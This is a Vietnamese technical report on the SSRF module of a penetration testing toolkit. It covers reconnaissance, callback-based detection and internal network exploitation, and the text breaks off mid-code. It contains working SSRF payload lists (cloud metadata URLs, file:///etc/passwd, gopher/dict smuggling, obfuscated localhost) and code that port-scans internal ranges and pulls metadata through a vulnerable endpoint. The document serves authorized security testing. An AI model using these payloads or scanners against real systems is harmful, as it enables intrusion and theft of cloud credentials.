# BÁO CÁO PHÂN TÍCH MODULE BLACKBOX
## Microservice Penetration Testing Toolkit

---

**Ngày tạo**: 18/12/2025  
**Phiên bản**: 1.0  
**Module**: Blackbox Testing  
**Mục đích**: Penetration Testing cho Microservices trong môi trường không có source code

---

## 📋 MỤC LỤC

1. [Tổng quan](#tổng-quan)
2. [Kiến trúc Module](#kiến-trúc-module)
3. [Phân tích chi tiết các thành phần](#phân-tích-chi-tiết)
4. [Quy trình Testing](#quy-trình-testing)
5. [Kỹ thuật và Chiến lược](#kỹ-thuật-và-chiến-lược)
6. [Kết quả và Phát hiện](#kết-quả-và-phát-hiện)
7. [Khuyến nghị](#khuyến-nghị)

---

## 1. TỔNG QUAN

### 1.1. Giới thiệu

Module **Blackbox** là thành phần cốt lõi của Microservice Penetration Testing Toolkit, được thiết kế để thực hiện penetration testing trên các ứng dụng microservice mà không cần access vào source code. Module tập trung vào việc phát hiện và khai thác lỗ hổng **SSRF (Server-Side Request Forgery)** - một trong những lỗ hổng nguy hiểm nhất trong kiến trúc microservices.

### 1.2. Phạm vi

- **Loại testing**: Black-box penetration testing
- **Lỗ hổng chính**: SSRF (Server-Side Request Forgery)
- **Môi trường**: Web applications, APIs, Microservices
- **Phương pháp**: Automated reconnaissance, detection, và exploitation

### 1.3. Mục tiêu

1. **Reconnaissance**: Tự động khám phá endpoints, parameters, và API routes
2. **Detection**: Phát hiện SSRF vulnerabilities với độ chính xác cao
3. **Exploitation**: Khai thác lỗ hổng để truy cập internal network
4. **Validation**: Xác nhận lỗ hổng thông qua callback server

---

## 2. KIẾN TRÚC MODULE

### 2.1. Cấu trúc thư mục

```
blackbox/
├── __init__.py
├── reconnaissance/          # Khám phá và thu thập thông tin
│   ├── auto_discovery.py    # Tự động crawl và discover endpoints
│   ├── endpoint_discovery_v2.py  # Phát hiện API endpoints nâng cao
│   ├── js_analyzer.py       # Phân tích JavaScript
│   ├── parameter_fuzzer.py  # Fuzzing parameters
│   └── proxy_interceptor.py # Tích hợp với proxy tools
│
├── detection/               # Phát hiện lỗ hổng
│   ├── callback_strategies.py    # Chiến lược callback payloads
│   ├── external_callback.py      # Callback server
│   └── payload_strategy.py       # Quản lý payload strategies
│
└── exploitation/            # Khai thác lỗ hổng
    └── internal_scan.py     # Scan internal network qua SSRF
```

### 2.2. Luồng hoạt động tổng quan

```
┌─────────────────────┐
│   Target Domain    │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────────────────────────────────────────┐
│            PHASE 1: RECONNAISSANCE                      │
│  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐  │
│  │ Auto Crawl   │  │ API Discover│  │ JS Analysis  │  │
│  └──────────────┘  └─────────────┘  └──────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│            PHASE 2: PARAMETER DISCOVERY                 │
│  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐  │
│  │ URL Params   │  │ Form Fields │  │ API Params   │  │
│  └──────────────┘  └─────────────┘  └──────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│            PHASE 3: SSRF DETECTION                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │         Callback-based Detection                  │  │
│  │  - Generate unique test IDs                       │  │
│  │  - Inject callback URLs into parameters           │  │
│  │  - Monitor callback server                        │  │
│  │  - Analyze responses                              │  │
│  └──────────────────────────────────────────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│            PHASE 4: EXPLOITATION                        │
│  ┌──────────────────────────────────────────────────┐  │
│  │         Internal Network Scanning                 │  │
│  │  - Scan internal IPs and ports                    │  │
│  │  - Access cloud metadata                          │  │
│  │  - Read internal resources                        │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## 3. PHÂN TÍCH CHI TIẾT CÁC THÀNH PHẦN

### 3.1. RECONNAISSANCE MODULE

#### 3.1.1. Auto Discovery (`auto_discovery.py`)

**Mục đích**: Tự động crawl website và khám phá tất cả endpoints có thể.

**Chức năng chính**:

1. **Website Crawling**
   - Crawl toàn bộ website với configurable depth
   - Extract links từ HTML (thẻ `<a>`)
   - Filter non-HTTP URLs (tel:, mailto:, javascript:, etc.)
   - Respect same-domain policy

2. **Parameter Extraction**
   - Parse query parameters từ URLs
   - Extract form fields từ HTML forms
   - Identify POST parameters

3. **API Endpoint Discovery**
   - Phát hiện API endpoints thông qua:
     - JavaScript analysis (priority)
     - Path fuzzing với common API patterns
     - Sitemap.xml parsing
     - Robots.txt parsing

4. **Resource ID Extraction**
   - Extract real IDs từ URLs (ví dụ: `/products/123/`, `/orders/456/`)
   - Build resource maps (product IDs, user IDs, order IDs, etc.)
   - Use real IDs để generate realistic test payloads

**Ví dụ output**:
```python
{
    'endpoints': {
        'http://example.com/products/',
        'http://example.com/api/orders/',
        'http://example.com/user/profile/'
    },
    'parameters': {
        '/products/': ['id', 'category', 'sort'],
        '/api/orders/': ['order_id', 'status']
    },
    'resource_ids': {
        'product': {123, 456, 789},
        'order': {1001, 1002}
    }
}
```

**Kỹ thuật nâng cao**:
- Multi-threaded crawling
- Rate limiting để tránh bị block
- Authentication support (Bearer token, cookies)
- JavaScript-heavy website support
- Smart filtering để loại bỏ static resources

---

#### 3.1.2. Endpoint Discovery V2 (`endpoint_discovery_v2.py`)

**Mục đích**: Phát hiện API endpoints với độ chính xác cao.

**Các phương pháp discovery**:

1. **Wordlist-based Discovery**
   ```python
   # Common API paths
   /api/v1/users
   /api/v2/products
   /admin/api/
   /internal/services/
   ```

2. **Sitemap Parsing**
   - Parse sitemap.xml
   - Extract all URLs
   - Categorize by type (static, dynamic, API)

3. **Robots.txt Analysis**
   - Parse robots.txt
   - Identify disallowed paths (often interesting!)
   - Check for hidden admin panels

4. **JavaScript Analysis Integration**
   - Parse JavaScript files để tìm API calls
   - Extract fetch(), axios, XMLHttpRequest calls
   - Identify API base URLs và endpoints

5. **Content-Type Detection**
   - Identify JSON endpoints (application/json)
   - Identify XML endpoints (application/xml)
   - Prioritize API responses

**Validation & Filtering**:
```python
# URL validation
- Valid URL format check
- Internal/external classification
- Path normalization
- Duplicate elimination

# Interesting path detection
- Skip static files (.js, .css, .png, etc.)
- Skip common non-API paths (/static/, /assets/)
- Focus on dynamic paths
```

**Structured Output**:
```python
@dataclass
class EndpointResult:
    url: str
    method: str
    status_code: int
    content_length: int
    content_type: str
    response_time: float
    title: str
    server: str
    redirect_url: Optional[str]
    severity: str
    source: str  # 'wordlist', 'sitemap', 'javascript', etc.
    parameters: List[str]
    ssrf_potential: str  # 'high', 'medium', 'low'
```

---

#### 3.1.3. JavaScript Analyzer (`js_analyzer.py`)

**Mục đích**: Phân tích JavaScript để tìm hidden API endpoints.

**Quy trình phân tích**:

1. **JavaScript Extraction**
   ```python
   # Inline scripts
   <script>
       fetch('/api/users')
   </script>
   
   # External scripts
   <script src="/static/js/app.js"></script>
   ```

2. **Pattern Matching**
   ```javascript
   // Các pattern được detect:
   
   // fetch() calls
   fetch('/api/products/123')
   fetch('http://example.com/api/orders')
   
   // axios calls
   axios.get('/api/users')
   axios.post('/api/login', data)
   
   // XMLHttpRequest
   xhr.open('GET', '/api/data')
   
   // URL strings
   const apiUrl = '/api/v1/services'
   const endpoint = 'http://internal-service:8080/health'
   ```

3. **Endpoint Extraction Patterns**
   ```python
   # Regular expressions used:
   r"['\"]/(api/[^'\"]+)['\"]"           # API paths
   r"fetch\(['\"]([^'\"]+)['\"]"         # fetch calls
   r"axios\.[a-z]+\(['\"]([^'\"]+)['\"]" # axios calls
   r"http[s]?://[^'\"]+/[^'\"]*"         # Full URLs
   ```

4. **Validation**
   - Filter out external domains
   - Remove invalid paths
   - Normalize URLs
   - Deduplicate

**Smart Features**:
- Tự động thêm `/api` prefix cho React apps
- Detect common microservice patterns
- Identify internal service URLs
- Extract API versioning info

**Example Output**:
```python
{
    'http://example.com/api/products/',
    'http://example.com/api/orders/123/details',
    'http://internal-service:8080/health',
    'http://example.com/api/v2/users'
}
```

---

#### 3.1.4. Parameter Fuzzer (`parameter_fuzzer.py`)

**Mục đích**: Fuzzing parameters để tìm SSRF-prone parameters.

**Top SSRF Parameters** (prioritized):
```python
# Tier 1 - Most common
'url', 'uri', 'callback', 'callback_url', 
'webhook', 'webhook_url'

# Tier 2 - Common patterns
'redirect', 'fetch', 'load', 'target'

# Tier 3 - File/resource loading
'file', 'image', 'path', 'link', 'download'
```

**Test Payloads**:
```python
# Callback URL (primary)
'http://callback.example.com/{test_id}'

# Localhost variants
'http://127.0.0.1'
'http://localhost'

# Cloud metadata
'http://169.254.169.254/latest/meta-data/'

# Internal network
'http://192.168.1.1'
'http://10.0.0.1'
```

**Testing Strategy**:

1. **Baseline Request**
   - Send request without parameter
   - Record status code, content length, response time

2. **Test with Parameters**
   - Inject each parameter with each payload
   - Compare with baseline
   - Detect anomalies

3. **Response Analysis**
   ```python
   # Indicators of SSRF:
   - Different status code
   - Different content length
   - Longer response time (network delay)
   - Error messages revealing internal info
   - Connection timeout (internal port closed)
   ```

**Payload Categories**:
```python
PAYLOAD_MAP = {
    'aws': ['http://169.254.169.254', ...],
    'gcp': ['http://metadata.google.internal', ...],
    'localhost': ['http://127.0.0.1', 'http://localhost', ...],
    'docker': ['http://host.docker.internal', ...],
    'file': ['file:///etc/passwd']
}
```

**Custom Fuzzing**:
- Support custom parameter lists
- Support custom payload categories
- Configurable threads và timeout
- Rate limiting

---

### 3.2. DETECTION MODULE

#### 3.2.1. Callback Strategies (`callback_strategies.py`)

**Mục đích**: Generate sophisticated SSRF payloads với callback URLs.

**Payload Types**:

1. **Basic Payloads**
   ```python
   # Direct callback
   http://callback.server/{test_id}
   
   # With path
   http://callback.server/{test_id}/basic
   ```

2. **Protocol Bypass Payloads**
   ```python
   # Explicit protocols
   http://callback.server/{test_id}/proto
   https://callback.server/{test_id}/proto
   
   # Protocol-relative
   //callback.server/{test_id}/noscheme
   
   # Alternative protocols
   file://callback.server/{test_id}/alt-proto
   ftp://callback.server/{test_id}/alt-proto
   gopher://callback.server/{test_id}/alt-proto
   ```

3. **Encoding Payloads**
   ```python
   # URL encoding
   http%3A%2F%2Fcallback.server%2F{test_id}
   
   # Double encoding
   http%253A%252F%252Fcallback.server%252F{test_id}
   
   # HTML entity encoding
   &#104;&#116;&#116;&#112;://callback.server/{test_id}
   ```

4. **IP Obfuscation Payloads**
   ```python
   # Decimal notation
   http://2130706433/  # 127.0.0.1
   
   # Octal notation
   http://0177.0.0.1/
   
   # Hex notation
   http://0x7f.0x0.0x0.0x1/
   
   # Mixed notation
   http://127.1/
   ```

5. **DNS Rebinding Payloads**
   ```python
   # Wildcard DNS pointing to callback server
   http://{test_id}.callback.server/
   
   # With subdomain labels
   http://metadata.{test_id}.callback.server/
   ```

6. **Redirect-based Payloads**
   ```python
   # Open redirect through callback server
   http://callback.server/redirect?url=http://169.254.169.254
   ```

**Test ID Generation**:
```python
def generate_test_id(prefix='ssrf') -> str:
    # Format: ssrf-<counter>-<uuid>
    return f"{prefix}-{counter}-{uuid.uuid4().hex[:8]}"
    
# Example: ssrf-1-a3f9bc21
```

**Advanced Detection Class**:
```python
class AdvancedCallbackDetector:
    """
    Comprehensive SSRF detection với callback monitoring
    """
    
    def detect_ssrf(self, endpoint, parameter):
        # 1. Generate unique test ID
        test_id = self.generate_test_id()
        
        # 2. Generate payloads
        payloads = self.payload_generator.generate_all_payloads(test_id)
        
        # 3. Inject payloads
        for payload in payloads:
            self.inject_payload(endpoint, parameter, payload)
        
        # 4. Wait for callbacks
        time.sleep(5)
        
        # 5. Check callback server
        callbacks = self.check_callbacks(test_id)
        
        # 6. Analyze results
        return self.analyze_callbacks(callbacks)
```

---

#### 3.2.2. External Callback (`external_callback.py`)

**Mục đích**: HTTP server để nhận và phân tích SSRF callbacks.

**Kiến trúc Callback Server**:

```python
class CallbackHandler(BaseHTTPRequestHandler):
    """
    HTTP Request Handler để nhận callbacks
    """
    
    callback_queue = Queue()  # Shared queue
    
    def _handle_request(self, method):
        # 1. Extract request details
        client_ip = self.client_address[0]
        real_ip = self.get_real_ip()  # X-Forwarded-For
        
        # 2. Detect SSRF
        is_local = self.is_internal_ip(real_ip)
        is_ssrf = not is_local
        
        # 3. Log callback
        callback_data = {
            'timestamp': datetime.now(),
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'client_ip': client_ip,
            'real_ip': real_ip,
            'is_ssrf': is_ssrf
        }
        
        # 4. Store in queue
        self.callback_queue.put(callback_data)
        
        # 5. Send response
        self.send_html_response(callback_data)
```

**IP Detection Logic**:
```python
def get_real_ip(self):
    """
    Get real IP, considering proxies/ngrok
    """
    # Check X-Forwarded-For header
    forwarded = self.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    return self.client_address[0]

def is_internal_ip(self, ip):
    """
    Check if IP is internal/private
    """
    if ip in ['127.0.0.1', '::1', 'localhost']:
        return True
    
    if ip.startswith(('192.168.', '10.', '172.')):
        return True
    
    return False
```

**SSRF Confirmation**:
```python
# ✅ SSRF detected when:
- Request comes from PUBLIC IP
- Not from localhost/private range
- Contains valid test ID
- Matches expected payload pattern

# ❌ NOT SSRF when:
- Request from localhost
- Request from private IP range
- Test request from tester's machine
```

**HTML Response Dashboard**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Callback Detected</title>
</head>
<body>
    <h1>✅ SSRF Callback Received!</h1>
    <p>Time: {timestamp}</p>
    <p>From IP: {real_ip}</p>
    <p>Test ID: {test_id}</p>
    <p>Path: {path}</p>
    <p>Method: {method}</p>
    <h2>Request Headers:</h2>
    <pre>{headers}</pre>
</body>
</html>
```

**Database Storage**:
```python
# SQLite database schema
CREATE TABLE callbacks (
    id INTEGER PRIMARY KEY,
    timestamp TEXT,
    test_id TEXT,
    method TEXT,
    path TEXT,
    headers TEXT,
    client_ip TEXT,
    real_ip TEXT,
    is_ssrf INTEGER
)
```

**Monitoring & Analysis**:
```python
class CallbackMonitor:
    """Monitor và analyze callbacks real-time"""
    
    def start_monitoring(self):
        while True:
            callback = self.queue.get()
            
            if callback['is_ssrf']:
                self.alert_ssrf_found(callback)
                self.save_to_database(callback)
                self.generate_report(callback)
```

---

#### 3.2.3. Payload Strategy Manager (`payload_strategy.py`)

**Mục đích**: Quản lý và tổ chức payload strategies.

**Attack Depths**:
```python
class AttackDepth(Enum):
    QUICK = "quick"          # Fast scan (5-10 payloads)
    DEEP = "deep"            # Comprehensive (50+ payloads)
    CLOUD = "cloud"          # Cloud-specific (AWS, GCP, Azure)
    CONTAINER = "container"  # Docker/K8s specific
    SIDE_CHANNEL = "side_channel"  # Timing-based detection
```

**Payload Types**:
```python
class PayloadType(Enum):
    URL_BYPASS = "url_bypass"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    REDIRECT_BASED = "redirect_based"
    HEADER_INJECTION = "header_injection"
    TEMPLATE_INJECTION = "template_injection"
    BLIND_SSRF = "blind_ssrf"
```

**Configuration**:
```python
@dataclass
class PayloadConfig:
    attack_depth: AttackDepth
    payload_types: List[PayloadType]
    target_types: List[str]
    safe_mode: bool = True
    disable_destructive: bool = True
```

**Quick Scan Payloads**:
```python
def _get_quick_payloads(callback_url):
    return [
        {'payload': callback_url, 'type': 'direct'},
        {'payload': 'http://169.254.169.254/latest/meta-data/', 'type': 'cloud'},
        {'payload': 'http://localhost/', 'type': 'localhost'},
        {'payload': 'http://127.0.0.1/', 'type': 'localhost'},
    ]
```

**Deep Scan Payloads**:
```python
def _get_deep_payloads(callback_url):
    payloads = []
    
    # IP obfuscation
    payloads.extend([
        {'payload': 'http://0177.0.0.1/', 'type': 'ip_obfuscation'},
        {'payload': 'http://2130706433/', 'type': 'ip_obfuscation'},
        {'payload': 'http://0x7f.0x0.0x0.0x1/', 'type': 'ip_obfuscation'},
    ])
    
    # URL encoding
    payloads.extend([
        {'payload': 'http://%6c%6f%63%61%6c%68%6f%73%74/', 'type': 'encoding'},
        {'payload': 'http://127.0.0.1%2F', 'type': 'encoding'},
    ])
    
    # Protocol smuggling
    payloads.extend([
        {'payload': 'dict://127.0.0.1:11211/', 'type': 'protocol'},
        {'payload': 'gopher://127.0.0.1:6379/_INFO', 'type': 'protocol'},
    ])
    
    return payloads
```

**Cloud-specific Payloads**:
```python
def _get_cloud_payloads():
    return [
        # AWS
        {'payload': 'http://169.254.169.254/latest/meta-data/', 'cloud': 'aws'},
        {'payload': 'http://169.254.169.254/latest/user-data/', 'cloud': 'aws'},
        {'payload': 'http://169.254.169.254/latest/dynamic/instance-identity/', 'cloud': 'aws'},
        
        # GCP
        {'payload': 'http://metadata.google.internal/computeMetadata/v1/', 'cloud': 'gcp'},
        {'payload': 'http://metadata/computeMetadata/v1/', 'cloud': 'gcp'},
        
        # Azure
        {'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'cloud': 'azure'},
        
        # Alibaba Cloud
        {'payload': 'http://100.100.100.200/latest/meta-data/', 'cloud': 'alibaba'},
    ]
```

**Container-specific Payloads**:
```python
def _get_container_payloads():
    return [
        # Docker
        {'payload': 'http://host.docker.internal/', 'env': 'docker'},
        {'payload': 'http://172.17.0.1/', 'env': 'docker'},
        {'payload': 'unix:///var/run/docker.sock', 'env': 'docker'},
        
        # Kubernetes
        {'payload': 'https://kubernetes.default.svc/', 'env': 'k8s'},
        {'payload': 'http://kubernetes.default/', 'env': 'k8s'},
        
        # Service discovery
        {'payload': 'http://consul:8500/', 'env': 'consul'},
        {'payload': 'http://etcd:2379/', 'env': 'etcd'},
    ]
```

**Safe Mode Filtering**:
```python
def _apply_safe_filters(payloads):
    """
    Filter out destructive payloads in safe mode
    """
    safe_payloads = []
    
    for payload in payloads:
        # Skip destructive payloads
        if payload.get('destructive'):
            continue
        
        # Skip file:// protocol
        if payload['payload'].startswith('file://'):
            continue
        
        # Skip dangerous Gopher attacks
        if 'gopher://' in payload['payload'] and 'FLUSHALL' in payload['payload']:
            continue
        
        safe_payloads.append(payload)
    
    return safe_payloads
```

---

### 3.3. EXPLOITATION MODULE

#### 3.3.1. Internal Scanner (`internal_scan.py`)

**Mục đích**: Scan internal network thông qua SSRF vulnerability.

**Architecture**:
```python
class InternalScanner:
    """
    Scanner để scan internal network qua SSRF
    """
    
    COMMON_PORTS = [
        80, 443, 8080, 8081,        # HTTP services
        5432, 3306, 27017,           # Databases
        6379, 11211,                 # Cache
        9200, 5672, 9092             # Services
    ]
    
    DOCKER_RANGES = [
        '172.17.0.0/16',  # Default bridge
        '172.18.0.0/16',  # Custom networks
        '10.0.0.0/8',     # Private range
    ]
```

**Port Scanning**:
```python
def scan_port(self, host: str, port: int) -> Dict:
    """
    Scan một port qua SSRF
    """
    target = f"http://{host}:{port}"
    payload_url = f"{ssrf_url}?{ssrf_param}={target}"
    
    try:
        start_time = time.time()
        response = session.get(payload_url, timeout=timeout)
        elapsed = time.time() - start_time
        
        # Analyze response để detect port state
        is_open = self._analyze_response(response, elapsed, port)
        
        if is_open:
            return {
                'host': host,
                'port': port,
                'status': 'open',
                'response_time': elapsed,
                'service': self._guess_service(port, response)
            }
    
    except Timeout:
        return {'port': port, 'status': 'timeout'}
    except Exception:
        return {'port': port, 'status': 'closed'}
```

**Response Analysis**:
```python
def _analyze_response(self, response, elapsed, port):
    """
    Phân tích response để xác định port state
    """
    # Port open indicators:
    
    # 1. Success status codes
    if response.status_code in [200, 301, 302, 401, 403]:
        return True
    
    # 2. Non-empty response
    if len(response.text) > 100:
        return True
    
    # 3. Quick response (< 1s) indicates open port
    if elapsed < 1.0:
        return True
    
    # 4. Service-specific signatures
    if port == 6379 and b'REDIS' in response.content:
        return True
    
    if port == 9200 and b'elasticsearch' in response.content:
        return True
    
    return False
```

**Service Detection**:
```python
def _guess_service(self, port: int, response) -> str:
    """
    Guess service từ port và response content
    """
    # Common port → service mapping
    PORT_SERVICES = {
        80: 'HTTP',
        443: 'HTTPS',
        8080: 'HTTP-Proxy',
        3306: 'MySQL',
        5432: 'PostgreSQL',
        27017: 'MongoDB',
        6379: 'Redis',
        11211: 'Memcached',
        9200: 'Elasticsearch',
        5672: 'RabbitMQ',
        9092: 'Kafka',
    }
    
    # Check port mapping
    service = PORT_SERVICES.get(port, 'Unknown')
    
    # Check response signatures
    content = response.text.lower()
    
    if 'redis' in content:
        service = 'Redis'
    elif 'elasticsearch' in content:
        service = 'Elasticsearch'
    elif 'mongodb' in content:
        service = 'MongoDB'
    elif 'mysql' in content or 'mariadb' in content:
        service = 'MySQL'
    elif 'postgresql' in content or 'postgres' in content:
        service = 'PostgreSQL'
    
    return service
```

**Network Range Scanning**:
```python
def scan_network_range(self, network_range: str) -> List[Dict]:
    """
    Scan entire network range
    Example: '172.17.0.0/24'
    """
    import ipaddress
    
    network = ipaddress.ip_network(network_range)
    results = []
    
    # Scan each IP in range
    for ip in network.hosts():
        ip_str = str(ip)
        
        # Scan common ports for this IP
        for port in self.COMMON_PORTS:
            result = self.scan_port(ip_str, port)
            
            if result.get('status') == 'open':
                results.append(result)
                print(f"[+] Found: {ip_str}:{port} - {result['service']}")
    
    return results
```

**Docker Network Discovery**:
```python
def discover_docker_services(self) -> List[Dict]:
    """
    Discover services trong Docker network
    """
    discovered = []
    
    # Scan Docker default bridge
    for ip in range(1, 255):
        target_ip = f"172.17.0.{ip}"
        
        # Quick check common ports
        for port in [80, 8080, 3000, 5000, 8000]:
            result = self.scan_port(target_ip, port)
            
            if result.get('status') == 'open':
                discovered.append(result)
    
    return discovered
```

**Cloud Metadata Access**:
```python
def access_cloud_metadata(self) -> Dict:
    """
    Truy cập cloud metadata endpoints
    """
    metadata_urls = [
        # AWS
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        
        # GCP
        'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
        
        # Azure
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    ]
    
    results = {}
    
    for url in metadata_urls:
        try:
            payload_url = f"{self.ssrf_url}?{self.ssrf_param}={url}"
            response = self.session.get(payload_url, timeout=10)
            
            if response.status_code == 200:
                results[url] = {
                    'status': 'accessible',
                    'data': response.text[:500]  # Preview
                }
        except:
            continue
    
    return results
```

**Parallel Scanning**:
```python
def parallel_scan(self, targets: List[Tuple[str, int]]) -> List[Dict]:
    """
    Scan multiple targets in parallel
    """
    from concurrent.futures import ThreadPoolExecutor
    
    results = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        
        for host, port in targets:
            future = executor.submit(self.scan_port, host, port)
            futures.append(future)
        
        for future in as_completed(futures):
            result = future.result()
            if result.get('status') == 'open':
                results.append(result)
    
    return results
```

**Report Generation**:
```python
def generate_scan_report(self, results: List[Dict]) -> str:
    """
    Generate scan report
    """
    report = []
    report.append("=" * 60)
    report.append("INTERNAL NETWORK SCAN REPORT")
    report.append("=" * 60)
    report.append(f"\nTotal hosts scanned: {len(set(r['host'] for r in results))}")
    report.append(f"Total open ports found: {len(results)}\n")
    
    # Group by host
    by_host = {}
    for result in results:
        host = result['host']
        if host not in by_host:
            by_host[host] = []
        by_host[host].append(result)
    
    # Print each host
    for host, ports in by_host.items():
        report.append(f"\n[+] Host: {host}")
        for port_info in ports:
            report.append(f"    - Port {port_info['port']}: {port_info['service']}")
            report.append(f"      Response Time: {port_info['response_time']:.2f}s")
    
    report.append("\n" + "=" * 60)
    
    return '\n'.join(report)
```

---

## 4. QUY TRÌNH TESTING

### 4.1. Phase 1: Reconnaissance

**Mục tiêu**: Thu thập thông tin về target

**Bước 1: Khởi động**
```python
from blackbox.reconnaissance.auto_discovery import AutoDiscovery

# Initialize
discovery = AutoDiscovery(
    base_url='http://target.com',
    max_depth=3,
    auth_token='Bearer xxx'  # Optional
)
```

**Bước 2: Crawl Website**
```python
# Automatic crawling
results = discovery.run_full_discovery()

# Output:
# - 50+ URLs discovered
# - 20+ endpoints identified
# - 15+ parameters found
# - 10+ API routes extracted
```

**Bước 3: Phân tích JavaScript**
```python
# JavaScript analysis tự động chạy trong run_full_discovery()
# Tìm được:
# - Hidden API endpoints
# - Internal service URLs
# - Hardcoded credentials
# - Debug endpoints
```

**Bước 4: Identify Testable Endpoints**
```python
testable_endpoints = discovery._identify_testable_endpoints(results)

# Ví dụ testable endpoint:
{
    'url': 'http://target.com/api/fetch',
    'parameter': 'url',
    'method': 'GET',
    'source': 'javascript',
    'ssrf_potential': 'high'
}
```

---

### 4.2. Phase 2: SSRF Detection

**Mục tiêu**: Phát hiện SSRF vulnerabilities

**Bước 1: Start Callback Server**
```bash
# Terminal 1
python tools/callback_server.py --port 8000

# Hoặc với ngrok
ngrok http 8000
# Callback URL: https://abc123.ngrok.io
```

**Bước 2: Generate Payloads**
```python
from blackbox.detection.callback_strategies import CallbackPayloadGenerator

generator = CallbackPayloadGenerator('https://abc123.ngrok.io')

# Generate payloads cho mỗi endpoint
for endpoint in testable_endpoints:
    test_id = generator.generate_test_id()
    
    payloads = []
    payloads.extend(generator.generate_basic_payloads(test_id))
    payloads.extend(generator.generate_protocol_bypass_payloads(test_id))
    payloads.extend(generator.generate_encoding_payloads(test_id))
```

**Bước 3: Inject Payloads**
```python
import requests

for payload_data in payloads:
    # Inject vào parameter
    url = f"{endpoint['url']}?{endpoint['parameter']}={payload_data['payload']}"
    
    try:
        response = requests.get(url, timeout=10)
        print(f"[*] Tested: {payload_data['technique']}")
    except:
        pass
    
    time.sleep(0.5)  # Rate limiting
```

**Bước 4: Monitor Callbacks**
```python
# Callback server tự động log callbacks
# Check logs:

# Console output:
"""
📞 CALLBACK RECEIVED!
Time: 2025-12-18 10:30:45
From: 52.123.45.67:43210
Real IP: 52.123.45.67
Status: ✅ PUBLIC IP (potential SSRF!)
🎯 SSRF Detected: YES ✅
Method: GET
Path: /ssrf-1-a3f9bc21/
User-Agent: python-requests/2.28.0
"""
```

**Bước 5: Analyze Results**
```python
# Query callback database
import sqlite3

conn = sqlite3.connect('callbacks.db')
cursor = conn.cursor()

cursor.execute("""
    SELECT test_id, real_ip, path, timestamp
    FROM callbacks
    WHERE is_ssrf = 1
    ORDER BY timestamp DESC
""")

ssrf_findings = cursor.fetchall()

print(f"[+] Found {len(ssrf_findings)} SSRF vulnerabilities!")
```

---

### 4.3. Phase 3: Validation & Exploitation

**Mục tiêu**: Validate và khai thác SSRF

**Bước 1: Confirm SSRF**
```python
# Re-test với callback URL
confirmed_ssrf = []

for finding in ssrf_findings:
    endpoint = finding['endpoint']
    parameter = finding['parameter']
    
    # Test multiple times
    success_count = 0
    for i in range(3):
        test_id = f"confirm-{i}"
        callback_url = f"https://abc123.ngrok.io/{test_id}"
        
        # Inject
        response = requests.get(
            f"{endpoint}?{parameter}={callback_url}",
            timeout=10
        )
        
        # Wait for callback
        time.sleep(3)
        
        # Check
        if check_callback_received(test_id):
            success_count += 1
    
    # Confirmed if >= 2/3 successful
    if success_count >= 2:
        confirmed_ssrf.append(finding)

print(f"[+] Confirmed {len(confirmed_ssrf)} SSRF vulnerabilities")
```

**Bước 2: Internal Scan**
```python
from blackbox.exploitation.internal_scan import InternalScanner

# Initialize scanner
scanner = InternalScanner(
    ssrf_url=confirmed_ssrf[0]['endpoint'],
    ssrf_param=confirmed_ssrf[0]['parameter'],
    timeout=5
)

# Scan Docker network
print("[*] Scanning Docker network...")
docker_services = scanner.scan_network_range('172.17.0.0/24')

print(f"[+] Found {len(docker_services)} services:")
for service in docker_services:
    print(f"    {service['host']}:{service['port']} - {service['service']}")
```

**Bước 3: Cloud Metadata Access**
```python
# Try accessing cloud metadata
print("[*] Attempting cloud metadata access...")
metadata = scanner.access_cloud_metadata()

if metadata:
    print("[+] Cloud metadata accessible!")
    for url, data in metadata.items():
        print(f"\n[+] {url}")
        print(f"    {data['data'][:200]}...")
```

**Bước 4: Generate Report**
```python
# Generate comprehensive report
report = {
    'target': 'http://target.com',
    'scan_date': '2025-12-18',
    'ssrf_vulnerabilities': len(confirmed_ssrf),
    'findings': []
}

for ssrf in confirmed_ssrf:
    finding = {
        'endpoint': ssrf['endpoint'],
        'parameter': ssrf['parameter'],
        'method': ssrf['method'],
        'severity': 'HIGH',
        'impact': 'Can access internal network',
        'proof': ssrf['callback_logs'],
        'remediation': 'Implement URL whitelist and disable unnecessary protocols'
    }
    report['findings'].append(finding)

# Save report
with open('ssrf_report.json', 'w') as f:
    json.dump(report, f, indent=2)
```

---

## 5. KỸ THUẬT VÀ CHIẾN LƯỢC

### 5.1. SSRF Detection Techniques

#### 5.1.1. Callback-based Detection (Primary)

**Ưu điểm**:
- ✅ Độ chính xác cao (100% confirm)
- ✅ Không false positives
- ✅ Detect blind SSRF
- ✅ Works với mọi loại response

**Cách thức**:
1. Deploy callback server (ngrok, VPS)
2. Generate unique test IDs
3. Inject callback URLs vào parameters
4. Monitor incoming requests
5. Match test IDs → Confirm SSRF

**Example**:
```python
# Test ID: ssrf-1-a3f9bc21
# Callback URL: https://callback.com/ssrf-1-a3f9bc21

# Inject vào parameter:
GET /api/fetch?url=https://callback.com/ssrf-1-a3f9bc21

# Nếu callback server nhận request với path="/ssrf-1-a3f9bc21"
# → SSRF CONFIRMED ✅
```

---

#### 5.1.2. Time-based Detection

**Ưu điểm**:
- ✅ Works khi không có callback server
- ✅ Detect internal network timing differences

**Cách thức**:
```python
# Baseline: Request với invalid URL
start = time.time()
requests.get('/api/fetch?url=http://invalid.local')
baseline_time = time.time() - start  # ~1-2s (quick fail)

# Test: Request với internal IP
start = time.time()
requests.get('/api/fetch?url=http://192.168.1.1:8080')
